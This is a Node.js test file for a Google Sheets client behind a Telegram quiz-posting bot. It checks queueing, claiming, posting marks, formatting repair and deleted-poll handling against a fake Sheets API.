// ============================================================================
// Direct Sheets API client (src/sheets-direct.js)
// ============================================================================
// Runs the posting path against an in-memory spreadsheet behind a fake
// Sheets API, and checks it reads and writes exactly what the Apps Script
// does — the two share every sheet, so each must understand the other's marks.
// ============================================================================

const test = require('node:test');
const assert = require('node:assert/strict');
const crypto = require('crypto');

const { privateKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
process.env.GOOGLE_SERVICE_ACCOUNT_JSON = JSON.stringify({
  client_email: 'bot@test.iam.gserviceaccount.com',
  private_key: privateKey.export({ type: 'pkcs8', format: 'pem' }),
  token_uri: 'https://oauth2.googleapis.com/token'
});

const direct = require('../src/sheets-direct');
const { DIRECT, _internal } = direct;

const HEADERS = ['S.No', 'Question ID', 'Date', 'Newspaper', 'Subject', 'Topic', 'Question',
  'Option A', 'Option B', 'Option C', 'Option D', 'Correct Answer', 'Explanation', 'Difficulty',
  'Tags', 'Source URL', 'Status', 'Posted', 'Posted At', 'Scheduled For', 'Thread ID',
  'Telegram Msg ID', 'Poll ID', 'Times Posted', 'Added At', 'Added By', 'Updated At',
  'Updated By', 'Dup Hash', 'Review Notes'];
const col = (h) => HEADERS.indexOf(h);

function question(n, overrides = {}) {
  const row = HEADERS.map(() => '');
  Object.assign(row, {
    [col('S.No')]: n, [col('Question ID')]: `PHY-${n}`, [col('Date')]: 46151, // 09-05-2026
    [col('Question')]: `Question ${n}?`, [col('Option A')]: 2005, [col('Option B')]: 'b',
    [col('Option C')]: 'c', [col('Option D')]: 'd', [col('Correct Answer')]: 'a',
    [col('Status')]: 'Approved', [col('Posted')]: 'NO'
  });
  Object.entries(overrides).forEach(([h, v]) => { row[col(h)] = v; });
  return row;
}

/** A fake Sheets API over { tabName: rows[][] }. */
function fakeSheets(book) {
  const log = { writes: [] };
  const letterToIndex = (letters) => letters.split('').reduce((n, c) => n * 26 + c.charCodeAt(0) - 64, 0) - 1;
  const parse = (range) => {
    const m = decodeURIComponent(range).match(/^'((?:[^']|'')+)'!([A-Z]+)(\d+)(?::([A-Z]+)(\d*))?$/);
    return { tab: m[1].replace(/''/g, "'"), col: letterToIndex(m[2]), row: Number(m[3]) };
  };
  globalThis.fetch = async (url, init = {}) => {
    const u = String(url);
    const reply = (status, body) => ({ ok: status < 300, status, json: async () => body });
    if (u.startsWith('https://oauth2.googleapis.com/token')) return reply(200, { access_token: 'tok', expires_in: 3600 });
    // Sheet metadata: every formatting request needs the numeric sheetId. It
    // hangs off the spreadsheet itself, so it is matched before the path is
    // stripped — there is no path left once the id is taken off.
    if (init.method !== 'POST' && /\?fields=sheets/.test(u)) {
      log.metaReads = (log.metaReads || 0) + 1;
      return reply(200, {
        sheets: Object.keys(book).map((title, i) => ({
          properties: { sheetId: i + 100, title },
          conditionalFormats: log.existingRules || []
        }))
      });
    }
    const path = u.replace(/^https:\/\/sheets\.googleapis\.com\/v4\/spreadsheets\/[^/:?]+/, '');
    if (init.method === 'POST' && path.startsWith('/values:batchUpdate')) {
      const body = JSON.parse(init.body);
      assert.equal(body.valueInputOption, 'RAW');
      for (const d of body.data) {
        const r = parse(d.range);
        const rows = book[r.tab];
        while (rows.length < r.row) rows.push([]);
        rows[r.row - 1][r.col] = d.values[0][0];
        log.writes.push({ tab: r.tab, row: r.row, header: book[r.tab][0][r.col], value: d.values[0][0] });
      }
      if (log.afterWrite) log.afterWrite();
      return reply(200, {});
    }
    if (init.method === 'POST' && path.startsWith(':batchUpdate')) {
      const requests = JSON.parse(init.body).requests;
      log.formatRequests = (log.formatRequests || []).concat(requests);
      const add = requests[0].addSheet;
      if (add) book[add.properties.title] = [];
      return reply(200, {});
    }
    const append = path.match(/^\/values\/([^?:]+):append/);
    if (init.method === 'POST' && append) {
      const tab = parse(append[1]).tab;
      const first = book[tab].length + 1;
      JSON.parse(init.body).values.forEach((v) => book[tab].push(v.slice()));
      log.appends = (log.appends || 0) + 1;
      return reply(200, { updates: { updatedRange: `'${tab}'!A${first}:AD${book[tab].length}` } });
    }
    if (init.method === 'PUT') {
      const r = parse(path.match(/^\/values\/([^?]+)/)[1]);
      book[r.tab][r.row - 1] = JSON.parse(init.body).values[0].slice();
      return reply(200, {});
    }
    const m = path.match(/^\/values\/([^?]+)/);
    const r = parse(m[1]);
    if (!book[r.tab]) return reply(400, { error: { message: 'Unable to parse range' } });
    return reply(200, { values: book[r.tab].slice(r.row - 1) });
  };
  return log;
}

const realFetch = globalThis.fetch;
test.afterEach(() => { globalThis.fetch = realFetch; });
const ctx = { spreadsheetId: 'SHEET', url: 'x' };

test('IST stamps round-trip exactly as the Apps Script writes them', () => {
  const at = new Date(Date.UTC(2026, 8, 18, 9, 46, 5));
  assert.equal(_internal.istNow(at), '18-09-2026, 03:16:05 PM IST');
  assert.equal(_internal.parseIstDate('18-09-2026, 03:16:05 PM IST').getTime(), at.getTime());
  assert.equal(_internal.istNow(new Date(Date.UTC(2026, 0, 1, 18, 45))), '02-01-2026, 12:15:00 AM IST');
  assert.equal(_internal.columnLetter(30), 'AD');
  assert.equal(_internal.quoteTab("Rahul's"), "'Rahul''s'");
});

test('the posting queue skips posted, claimed, rejected and draft rows, like the Apps Script', async () => {
  fakeSheets({ Physics: [HEADERS,
    question(1, { Posted: 'YES' }),
    question(2, { Posted: 'SENDING | 18-09-2026, 03:16:05 PM IST | Approved' }),
    question(3, { Status: 'Rejected' }),
    question(4, { Status: 'Draft' }),
    question(5),
    question(6, { Status: 'Scheduled' })
  ] });
  const qs = await DIRECT.getUnpostedQuestions(ctx, 'Physics', 10, true);
  assert.deepEqual(qs.map((q) => q.excel_row), [6, 7]);
  assert.equal(qs[0].date, '09-05-2026', 'a date cell reads as dd-MM-yyyy, as the Apps Script gives it');
  assert.equal(qs[0].option_a, '2005');
  assert.equal(qs[0].correct_answer, 'A');
  const withDrafts = await DIRECT.getUnpostedQuestions(ctx, 'Physics', 10, false);
  assert.deepEqual(withDrafts.map((q) => q.excel_row), [5, 6, 7]);
});

test('a claim writes the Apps Script marker and a second claim is refused', async () => {
  const book = { Physics: [HEADERS, question(1, { Status: 'Scheduled' }), question(2, { Posted: 'YES' })] };
  fakeSheets(book);
  const first = await DIRECT.claimQuestions(ctx, 'Physics', [2, 3, 99]);
  assert.deepEqual(first.claimed, [2]);
  assert.deepEqual(first.skipped.map((s) => s.reason).sort(), ['already posted', 'no such row']);
  assert.match(book.Physics[1][col('Posted')], /^SENDING \| \d{2}-\d{2}-\d{4}, .* IST \| Scheduled \| [0-9a-f]{8}$/);
  assert.equal(book.Physics[1][col('Status')], 'Sending');

  const second = await DIRECT.claimQuestions(ctx, 'Physics', [2]);
  assert.deepEqual(second.claimed, []);
  assert.deepEqual(second.skipped, [{ row: 2, reason: 'already sending' }]);
});

test('a run that loses the race for a row does not send it', async () => {
  // Two runs read the row as free at the same moment. The one whose marker is
  // not in the cell afterwards must report it skipped, never send it.
  const book = { Physics: [HEADERS, question(1)] };
  const log = fakeSheets(book);
  log.afterWrite = () => { book.Physics[1][col('Posted')] = 'SENDING | 18-09-2026, 03:16:05 PM IST | Approved | other'; };
  const result = await DIRECT.claimQuestions(ctx, 'Physics', [2]);
  assert.deepEqual(result.claimed, []);
  assert.deepEqual(result.skipped, [{ row: 2, reason: 'already sending' }]);
});

test('marking posted records the full trail and counts the post', async () => {
  const book = { Physics: [HEADERS, question(1, { 'Times Posted': 1, Posted: 'SENDING | x | Approved' })] };
  fakeSheets(book);
  assert.equal(await DIRECT.markAsPosted(ctx, 'Physics', [2], 901, 33, { 2: 'poll-9' }), 1);
  const row = book.Physics[1];
  assert.equal(row[col('Posted')], 'YES');
  assert.equal(row[col('Status')], 'Posted');
  assert.equal(row[col('Times Posted')], 2);
  assert.equal(row[col('Thread ID')], 33);
  assert.equal(row[col('Telegram Msg ID')], 901);
  assert.equal(row[col('Poll ID')], 'poll-9');
  assert.match(row[col('Posted At')], /IST$/);
  await assert.rejects(DIRECT.markAsPosted(ctx, 'Physics', [50], 1, 1, null), /marked none/);
});

test('release restores the status and never touches a posted row', async () => {
  const book = { Physics: [HEADERS,
    question(1, { Posted: 'SENDING | x | Scheduled', Status: 'Sending' }),
    question(2, { Posted: 'YES', Status: 'Posted' })] };
  fakeSheets(book);
  assert.equal(await DIRECT.releaseQuestions(ctx, 'Physics', [2, 3], 'Scheduled'), 1);
  assert.equal(book.Physics[1][col('Posted')], 'NO');
  assert.equal(book.Physics[1][col('Status')], 'Scheduled');
  assert.equal(book.Physics[2][col('Posted')], 'YES');
});

test('stale claims are handed back with their own status; held and fresh ones are not', async () => {
  const fresh = _internal.istNow();
  const book = { Physics: [HEADERS,
    question(1, { Posted: 'SENDING | 01-01-2020, 10:00:00 AM IST | Scheduled', Status: 'Sending' }),
    question(2, { Posted: `SENDING | ${fresh} | Approved | abcd1234`, Status: 'Sending' }),
    question(3, { Posted: 'CHECK | 01-01-2020, 10:00:00 AM IST', Status: 'Sending' })] };
  fakeSheets(book);
  const result = await DIRECT.recoverStaleClaims(ctx, 'Physics', 10);
  assert.deepEqual(result.recovered.map((r) => [r.row, r.status]), [[2, 'Scheduled']]);
  assert.equal(result.held, 1);
  assert.equal(book.Physics[1][col('Status')], 'Scheduled');
  assert.match(book.Physics[2][col('Posted')], /^SENDING/);
});

test('holding a row marks it for checking and keeps the reason', async () => {
  const book = { Physics: [HEADERS, question(1, { Posted: 'SENDING | x | Approved', 'Review Notes': 'old note' })] };
  fakeSheets(book);
  assert.equal(await DIRECT.holdQuestions(ctx, 'Physics', [2], 'No answer from Telegram'), 1);
  assert.match(book.Physics[1][col('Posted')], /^CHECK \| .* IST$/);
  assert.match(book.Physics[1][col('Review Notes')], /^old note\n\[.* IST\] No answer from Telegram$/);
});

test('config is read from the Config tab', async () => {
  fakeSheets({ Config: [['Subject', 'Emoji', 'Thread', 'Cron', 'Batch', 'Active'],
    ['Physics', '⚛️', 33, '0 */3 * * *', 5, 'YES'], ['', '', '', '', '', '']] });
  assert.deepEqual(await DIRECT.readConfig(ctx), [{
    subject: 'Physics', emoji: '⚛️', topic_thread_id: 33, schedule_cron: '0 */3 * * *',
    questions_per_batch: 5, active: true
  }]);
});

test('a missing tab says so', async () => {
  fakeSheets({});
  await assert.rejects(DIRECT.getUnpostedQuestions(ctx, 'Nope', 1), /Sheet tab "Nope" not found/);
});

test('a group with a sheet id posts through the direct client', () => {
  process.env.SHEET_URL_APPSC_NEWS_TE = 'https://script.google.com/macros/s/x/exec';
  process.env.SHEET_TOKEN_APPSC_NEWS_TE = 't';
  process.env.SHEET_ID_APPSC_NEWS_TE = 'https://docs.google.com/spreadsheets/d/1K2N990WsFK9zXP5XipQj-XTrk80JAwYiPjDVtTPJrnM/edit#gid=0';
  const sheets = require('../src/sheets');
  const client = sheets.forGroup('appsc_news_te');
  assert.equal(client.direct, true);
  assert.equal(sheets.contextFor('appsc_news_te').spreadsheetId, '1K2N990WsFK9zXP5XipQj-XTrk80JAwYiPjDVtTPJrnM',
    'a pasted link is reduced to the id');
  delete process.env.SHEET_ID_APPSC_NEWS_TE;
  assert.equal(sheets.forGroup('appsc_news_te').direct, false, 'without an id it stays on the Apps Script');
});

test('adding questions issues the next ids, skips repeats and stores text as text', async () => {
  const book = { Physics: [HEADERS,
    question(1, { 'Question ID': 'PHY-20260918-0001', 'Dup Hash': 'made-by-an-old-script' }),
    question(2, { 'Question ID': 'PHY-20260918-0002' })] };
  const log = fakeSheets(book);
  const res = await DIRECT.addQuestions(ctx, 'Physics', [
    { question: 'Question 1?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'b' },
    { question: '=HYPERLINK("x")', option_a: '1-D, 2-C', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'c', date: '09-05-2026' },
    { question: '=HYPERLINK("x")', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd' }
  ], 'Tester (t@x)', true);
  assert.equal(res.addedCount, 1);
  assert.equal(res.skippedCount, 2, 'a repeat of an existing question and a repeat inside the batch');
  assert.match(res.ids[0], /^PHY-\d{8}-0003$/);
  const row = book.Physics[3];
  assert.equal(row[col('Question')], '=HYPERLINK("x")');
  assert.equal(row[col('S.No')], 3);
  assert.equal(row[col('Status')], 'Approved');
  assert.equal(row[col('Posted')], 'NO');
  assert.equal(row[col('Correct Answer')], 'C');
  assert.equal(row[col('Dup Hash')], _internal.hashQuestion('=HYPERLINK("x")'));
  assert.equal(row[col('Added By')], 'Tester (t@x)');
  assert.ok(log.appends === 1);
});

test('adding to a subject with no tab creates it', async () => {
  const book = {};
  fakeSheets(book);
  const res = await DIRECT.addQuestions(ctx, 'Art and Culture', [{ question: 'New?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd' }], 'T', true);
  assert.equal(res.addedCount, 1);
  assert.equal(book['Art and Culture'][0][col('Question')], 'Question');
  assert.match(res.ids[0], /^ART-\d{8}-0001$/);
  assert.equal(book['Art and Culture'][1][col('Question')], 'New?');
});

test('a new EPFO tab takes its prefix from the config, not the first three letters', async () => {
  // Indian Culture and Industrial Relations both start IND. The Apps Script is
  // built with CUL and IRL, and a question added through the API must match it.
  const book = {};
  fakeSheets(book);
  const epfo = Object.assign({}, ctx, { groupId: 'epfo' });
  const one = [{ question: 'New?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd' }];
  assert.match((await DIRECT.addQuestions(epfo, 'Indian Culture', one, 'T', true)).ids[0], /^CUL-\d{8}-0001$/);
  assert.match((await DIRECT.addQuestions(epfo, 'Industrial Relations', one, 'T', true)).ids[0], /^IRL-\d{8}-0001$/);
});

// ---------------------------------------------------------------------------
// The curation queue
// ---------------------------------------------------------------------------
// The bug these cover: the dashboard printed a line per question saying it had
// been queued, then "0 question(s) queued" underneath. A count on its own
// cannot tell an id that is not in the tab from a row the poster is holding,
// so both are now named.

test('queueing marks the rows Scheduled, stamps the time, and names what it missed', async () => {
  const book = { Physics: [HEADERS,
    question(1, { 'Question ID': 'POL-0001' }),
    question(2, { 'Question ID': 'POL-0002', Status: 'Draft' })] };
  fakeSheets(book);

  const res = await DIRECT.scheduleQuestions(
    ctx, 'Physics', ['POL-0001', 'POL-0002', 'POL-9999'], '07-09-2026 09:00 IST', 'Curator (c@x)');

  assert.equal(res.updatedCount, 2);
  assert.deepEqual(res.notFound, ['POL-9999'], 'an id that is not in this tab is named, not counted as done');
  assert.deepEqual(res.skipped, []);

  assert.equal(book.Physics[1][col('Status')], 'Scheduled');
  assert.equal(book.Physics[1][col('Scheduled For')], '07-09-2026 09:00 IST');
  assert.equal(book.Physics[1][col('Updated By')], 'Curator (c@x)');
  assert.match(book.Physics[1][col('Updated At')], /IST$/);
  assert.equal(book.Physics[2][col('Status')], 'Scheduled', 'a Draft can be queued');
});

test('queueing refuses a posted, sending or held row rather than setting it up to go out twice', async () => {
  const book = { Physics: [HEADERS,
    question(1, { 'Question ID': 'A', Posted: 'YES', Status: 'Posted' }),
    question(2, { 'Question ID': 'B', Posted: 'SENDING | x | Approved', Status: 'Sending' }),
    question(3, { 'Question ID': 'C', Posted: 'CHECK | x', Status: 'Sending' }),
    question(4, { 'Question ID': 'D' })] };
  fakeSheets(book);

  const res = await DIRECT.scheduleQuestions(ctx, 'Physics', ['A', 'B', 'C', 'D'], '', 'Curator');

  assert.equal(res.updatedCount, 1);
  assert.deepEqual(
    res.skipped.map((s) => [s.questionId, s.reason]),
    [['A', 'already posted'], ['B', 'being sent right now'], ['C', 'held for checking']]
  );
  assert.equal(book.Physics[1][col('Status')], 'Posted', 'the posted row is untouched');
  assert.equal(book.Physics[4][col('Status')], 'Scheduled');
});

test('unqueueing restores the status and clears the target time', async () => {
  const book = { Physics: [HEADERS,
    question(1, { 'Question ID': 'A', Status: 'Scheduled', 'Scheduled For': '07-09-2026 09:00 IST' })] };
  fakeSheets(book);

  const res = await DIRECT.unscheduleQuestions(ctx, 'Physics', ['A'], 'Approved', 'Curator');

  assert.equal(res.updatedCount, 1);
  assert.equal(book.Physics[1][col('Status')], 'Approved');
  assert.equal(book.Physics[1][col('Scheduled For')], '',
    'a stale target time left behind is how a sheet starts lying about its own plan');
});

test('unqueueing falls back to Approved for a status that is not a real one', async () => {
  const book = { Physics: [HEADERS, question(1, { 'Question ID': 'A', Status: 'Scheduled' })] };
  fakeSheets(book);
  await DIRECT.unscheduleQuestions(ctx, 'Physics', ['A'], 'Nonsense', 'Curator');
  assert.equal(book.Physics[1][col('Status')], 'Approved');
});

test('bulkStatus refuses the statuses the poster owns, and leaves Scheduled For alone', async () => {
  const book = { Physics: [HEADERS,
    question(1, { 'Question ID': 'A', Status: 'Scheduled', 'Scheduled For': 'keep me' })] };
  fakeSheets(book);

  await assert.rejects(DIRECT.bulkStatus(ctx, 'Physics', ['A'], 'Posted', 'C'), /set by the poster/);
  await assert.rejects(DIRECT.bulkStatus(ctx, 'Physics', ['A'], 'Sending', 'C'), /set by the poster/);

  const res = await DIRECT.bulkStatus(ctx, 'Physics', ['A'], 'Archived', 'C');
  assert.equal(res.updatedCount, 1);
  assert.equal(book.Physics[1][col('Status')], 'Archived');
  assert.equal(book.Physics[1][col('Scheduled For')], 'keep me');
});

test('bulkStatus may archive a question that has already been posted', async () => {
  // Unlike queueing: archiving something that went out is ordinary curation,
  // while marking it Scheduled would set it up to be sent a second time.
  const book = { Physics: [HEADERS, question(1, { 'Question ID': 'A', Posted: 'YES', Status: 'Posted' })] };
  fakeSheets(book);
  assert.equal((await DIRECT.bulkStatus(ctx, 'Physics', ['A'], 'Archived', 'C')).updatedCount, 1);
  assert.equal(book.Physics[1][col('Status')], 'Archived');
});

test('an id repeated in one request is written once', async () => {
  const book = { Physics: [HEADERS, question(1, { 'Question ID': 'A' })] };
  const log = fakeSheets(book);
  const res = await DIRECT.scheduleQuestions(ctx, 'Physics', ['A', 'a', ' A '], '', 'C');
  assert.equal(res.updatedCount, 1, 'ids match case-insensitively and a repeat is not counted twice');
  assert.equal(log.writes.filter((w) => w.header === 'Status').length, 1);
});

test('a queue write with nothing to do touches the sheet not at all', async () => {
  const book = { Physics: [HEADERS, question(1, { 'Question ID': 'A' })] };
  const log = fakeSheets(book);
  const res = await DIRECT.scheduleQuestions(ctx, 'Physics', ['NOPE'], '', 'C');
  assert.equal(res.updatedCount, 0);
  assert.deepEqual(res.notFound, ['NOPE']);
  assert.equal(log.writes.length, 0);
});

// ---------------------------------------------------------------------------
// Formatting
// ---------------------------------------------------------------------------
// The bug these cover: a tab filled through this client came out solid navy,
// bold white, top to bottom. `values:append` with insertDataOption=INSERT_ROWS
// does what inserting a row in the UI does — the new row inherits the
// formatting of the row above. The row above the first upload is the header.

/** Every repeatCell in a batch that sets a background, as [row range, colour]. */
function backgroundWrites(requests) {
  return (requests || [])
    .filter((r) => r.repeatCell && r.repeatCell.cell.userEnteredFormat.backgroundColor)
    .map((r) => ({
      startRowIndex: r.repeatCell.range.startRowIndex,
      endRowIndex: r.repeatCell.range.endRowIndex,
      background: r.repeatCell.cell.userEnteredFormat.backgroundColor,
      bold: r.repeatCell.cell.userEnteredFormat.textFormat.bold
    }));
}

test('appended rows are put back to the body style instead of inheriting the header', async () => {
  const book = { Physics: [HEADERS] };
  const log = fakeSheets(book);

  await DIRECT.addQuestions(ctx, 'Physics', [
    { question: 'New one?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'a' }
  ], 'Tester', true);

  const reset = backgroundWrites(log.formatRequests).find((w) => w.startRowIndex === 1);
  assert.ok(reset, 'the appended row was left with whatever formatting it inherited');
  assert.deepEqual(reset.background, { red: 1, green: 1, blue: 1 }, 'the row must go back to white');
  assert.equal(reset.bold, false);
  assert.equal(reset.endRowIndex, 2, 'exactly the one row that was appended');
});

test('the reset covers every appended row and no row that was already there', async () => {
  const book = { Physics: [HEADERS, question(1), question(2)] };
  const log = fakeSheets(book);

  await DIRECT.addQuestions(ctx, 'Physics', [
    { question: 'Third?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd' },
    { question: 'Fourth?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd' }
  ], 'Tester', true);

  const reset = backgroundWrites(log.formatRequests).find((w) => w.background.red === 1);
  assert.equal(reset.startRowIndex, 3, 'rows 4 and 5, which is where the append landed');
  assert.equal(reset.endRowIndex, 5);
});

test('an upload still succeeds when the formatting reset fails', async () => {
  // The questions are already safely in the sheet. Refusing an upload that
  // worked because its rows came out the wrong colour is the worse failure.
  const book = { Physics: [HEADERS] };
  const log = fakeSheets(book);
  const realFetchInner = globalThis.fetch;
  globalThis.fetch = async (url, init) => {
    if (/\?fields=sheets/.test(String(url))) throw new Error('metadata unavailable');
    return realFetchInner(url, init);
  };

  const res = await DIRECT.addQuestions(ctx, 'Physics', [
    { question: 'Still added?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd' }
  ], 'Tester', true);

  assert.equal(res.addedCount, 1);
  assert.equal(book.Physics[1][col('Question')], 'Still added?');
  assert.ok(log.appends === 1);
});

test('a new tab is styled as it is created, not left plain', async () => {
  const book = {};
  const log = fakeSheets(book);
  await DIRECT.addQuestions(ctx, 'Art and Culture',
    [{ question: 'New?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd' }], 'T', true);

  const header = backgroundWrites(log.formatRequests)
    .find((w) => w.startRowIndex === 0 && w.endRowIndex === 1);
  assert.ok(header, 'the header row was never styled');
  assert.equal(header.bold, true);
  assert.deepEqual(header.background, _internal.rgb('#1a237e'));
});

test('repairing a tab restores the header, the widths, the panes and the colour coding', async () => {
  const book = { Physics: [HEADERS, question(1), question(2)] };
  const log = fakeSheets(book);

  const res = await DIRECT.formatQuestions(ctx, 'Physics');
  assert.deepEqual(res, { subject: 'Physics', rows: 2 });

  const requests = log.formatRequests;
  const kinds = new Set(requests.map((r) => Object.keys(r)[0]));
  assert.ok(kinds.has('updateSheetProperties'), 'the frozen panes were not restored');
  assert.ok(kinds.has('updateDimensionProperties'), 'the column widths were not restored');
  assert.ok(kinds.has('setDataValidation'), 'the dropdowns were not restored');
  assert.ok(kinds.has('addConditionalFormatRule'), 'the colour coding was not restored');

  const frozen = requests.find((r) => r.updateSheetProperties).updateSheetProperties.properties;
  assert.equal(frozen.gridProperties.frozenRowCount, 1);
  assert.equal(frozen.gridProperties.frozenColumnCount, 2, 'S.No and Question ID stay visible');

  const widths = requests.filter((r) => r.updateDimensionProperties &&
    r.updateDimensionProperties.range.dimension === 'COLUMNS');
  assert.equal(widths.length, 30, 'every one of the 30 columns gets its width');

  // The body must come back white and unbold — the whole point of the repair.
  const body = backgroundWrites(requests).find((w) => w.startRowIndex === 1);
  assert.deepEqual(body.background, { red: 1, green: 1, blue: 1 });
  assert.equal(body.bold, false);

  // The rules a curator reads state by: Posted, Status and Difficulty.
  const rules = requests.filter((r) => r.addConditionalFormatRule)
    .map((r) => r.addConditionalFormatRule.rule.booleanRule.condition.values[0].userEnteredValue);
  assert.deepEqual(rules, ['YES', 'NO', 'Approved', 'Posted', 'Scheduled', 'Review',
    'Rejected', 'Archived', 'Deleted', 'Easy', 'Medium', 'Hard']);
});

test('repairing twice does not leave two of every colour rule behind', async () => {
  const book = { Physics: [HEADERS, question(1)] };
  const log = fakeSheets(book);
  // What the sheet already carries from the first repair.
  log.existingRules = new Array(12).fill({});

  await DIRECT.formatQuestions(ctx, 'Physics');

  const deletes = log.formatRequests.filter((r) => r.deleteConditionalFormatRule);
  assert.equal(deletes.length, 12, 'the rules already there were not cleared first');
  // Highest index first: deleting index 0 first would renumber the rest.
  assert.deepEqual(deletes.map((d) => d.deleteConditionalFormatRule.index),
    [11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0]);
});

test('an empty tab is still styled rather than skipped for having no rows', async () => {
  const book = { Physics: [HEADERS] };
  const log = fakeSheets(book);
  const res = await DIRECT.formatQuestions(ctx, 'Physics');
  assert.equal(res.rows, 0);
  assert.ok(log.formatRequests.some((r) => r.setDataValidation),
    'a tab with no questions yet still needs its dropdowns');
});

test('the long-form columns wrap and the rest stay on one line', async () => {
  // Without this every row would grow to the height of its longest cell.
  const requests = _internal.bodyFormatRequests(100, 2, 10);
  const wrapped = requests
    .filter((r) => r.repeatCell.cell.userEnteredFormat.wrapStrategy === 'WRAP')
    .map((r) => r.repeatCell.range.startColumnIndex + 1);
  assert.deepEqual(wrapped, [7, 8, 9, 10, 11, 13, 30], 'Question, the four options, Explanation, Review Notes');
  assert.equal(requests[0].repeatCell.cell.userEnteredFormat.wrapStrategy, 'CLIP');
});

test('repairing a tab that is not there says which one', async () => {
  fakeSheets({ Physics: [HEADERS] });
  await assert.rejects(DIRECT.formatQuestions(ctx, 'Nope'), /Sheet tab "Nope" not found/);
});

// ---------------------------------------------------------------------------
// A poll deleted from Telegram
// ---------------------------------------------------------------------------
// Telegram never tells a bot one of its messages was deleted, so the sheet used
// to claim for ever that a removed question was posted. Marking it is only half
// the job; the other half is that the row must not quietly become eligible
// again and go back out.

test('a deleted poll is marked Deleted and keeps Posted = YES, so it is never re-sent', async () => {
  const book = { Physics: [HEADERS,
    question(1, { Posted: 'YES', Status: 'Posted', 'Telegram Msg ID': 901 })] };
  fakeSheets(book);

  assert.equal(await DIRECT.markDeleted(ctx, 'Physics', [2], 'Deleted from the Telegram group'), 1);

  const row = book.Physics[1];
  assert.equal(row[col('Status')], 'Deleted');
  assert.equal(row[col('Posted')], 'YES',
    'clearing Posted would put the question back in the queue and post it again');
  assert.equal(row[col('Telegram Msg ID')], 901, 'the record of what was deleted stays');
  assert.equal(row[col('Updated By')], 'Deleted-poll check');
  assert.match(row[col('Review Notes')], /^\[.* IST\] Deleted from the Telegram group$/);

  // And the posting queue agrees: it is not eligible.
  const queue = await DIRECT.getUnpostedQuestions(ctx, 'Physics', 10, true);
  assert.deepEqual(queue.map((q) => q.excel_row), []);
});

test('a note is added to whatever the row already said, not over it', async () => {
  const book = { Physics: [HEADERS,
    question(1, { Posted: 'YES', Status: 'Posted', 'Review Notes': 'checked by Ravi' })] };
  fakeSheets(book);
  await DIRECT.markDeleted(ctx, 'Physics', [2], 'Deleted from the Telegram group');
  assert.match(book.Physics[1][col('Review Notes')], /^checked by Ravi\n\[.* IST\] Deleted from/);
});

test('marking skips a row that is not posted, and one already marked', async () => {
  const book = { Physics: [HEADERS,
    question(1, { Posted: 'NO', Status: 'Approved' }),
    question(2, { Posted: 'YES', Status: 'Deleted' }),
    question(3, { Posted: 'YES', Status: 'Posted' })] };
  const log = fakeSheets(book);

  assert.equal(await DIRECT.markDeleted(ctx, 'Physics', [2, 3, 4], 'gone'), 1);
  assert.equal(book.Physics[1][col('Status')], 'Approved', 'an unposted row cannot have been deleted');
  assert.equal(book.Physics[3][col('Status')], 'Deleted');
  // Re-marking would append the same note again on every nightly sweep.
  assert.equal(log.writes.filter((w) => w.row === 3).length, 0);
});

test('a marked question is not offered to the next sweep', async () => {
  // Otherwise every sweep would re-ask Telegram about a message everyone
  // agrees is gone, and spend its budget there instead of on unchecked rows.
  const book = { Physics: [HEADERS,
    question(1, { Posted: 'YES', Status: 'Posted', 'Telegram Msg ID': 901 }),
    question(2, { Posted: 'YES', Status: 'Deleted', 'Telegram Msg ID': 902 })] };
  fakeSheets(book);

  const posted = await DIRECT.listPosted(ctx, 'Physics');
  assert.deepEqual(posted.map((p) => p.message_id), ['901']);
});

test('marking nothing writes nothing', async () => {
  const book = { Physics: [HEADERS, question(1, { Posted: 'YES', Status: 'Posted' })] };
  const log = fakeSheets(book);
  assert.equal(await DIRECT.markDeleted(ctx, 'Physics', [], 'gone'), 0);
  assert.equal(await DIRECT.markDeleted(ctx, 'Physics', [99], 'gone'), 0);
  assert.equal(log.writes.length, 0);
});

test('Deleted is a status the poster owns, not one a curator sets by hand', async () => {
  // Setting it by hand would leave Status saying Deleted on a row that is
  // still in the channel, which is the same desynchronisation as Posted.
  const book = { Physics: [HEADERS, question(1, { 'Question ID': 'A' })] };
  fakeSheets(book);
  await assert.rejects(DIRECT.bulkStatus(ctx, 'Physics', ['A'], 'Deleted', 'C'), /set by the poster/);
});

test('a marked question can still be put back deliberately', async () => {
  // Re-queueing is the separate, explicit decision — for a poll deleted by
  // accident that a curator does want posted again.
  const book = { Physics: [HEADERS,
    question(1, { Posted: 'YES', Status: 'Deleted', 'Telegram Msg ID': 901 })] };
  fakeSheets(book);

  assert.equal(await DIRECT.unpostQuestions(ctx, 'Physics', [2], 'Approved'), 1);
  assert.equal(book.Physics[1][col('Posted')], 'NO');
  assert.equal(book.Physics[1][col('Status')], 'Approved');
  assert.equal(book.Physics[1][col('Telegram Msg ID')], '');

  const queue = await DIRECT.getUnpostedQuestions(ctx, 'Physics', 10, true);
  assert.deepEqual(queue.map((q) => q.excel_row), [2], 'it is eligible again, on purpose');
});

// ---------------------------------------------------------------------------
// Referrals
// ---------------------------------------------------------------------------
// Two tabs, created on first use. The one that matters most is the log: it is
// what answers "who joined using whose code", and it is the record a payout is
// made from, so a sale counted twice is money paid twice.

/** The original seven columns, as the live sheets were created with. */
const OLD_REFERRAL_HEADERS = ['Code', 'Telegram ID', 'Username', 'Name', 'Status', 'Created At', 'Notes'];
const REFERRAL_HEADERS = [...OLD_REFERRAL_HEADERS, 'Share Link', 'Link Opens', 'Opened By (IDs)', 'Joined',
  'Joined IDs', 'Joined Usernames', 'Total Earned', 'Pending', 'Paid Out', 'Last Joined At', 'Updated At'];
const OLD_LOG_HEADERS = ['Timestamp', 'Code', 'Referrer ID', 'Referrer Username', 'Referred ID',
  'Referred Username', 'Referred Name', 'Group', 'Payment ID', 'Original Amount', 'Discount',
  'Paid Amount', 'Commission', 'Status', 'Paid At', 'Notes'];
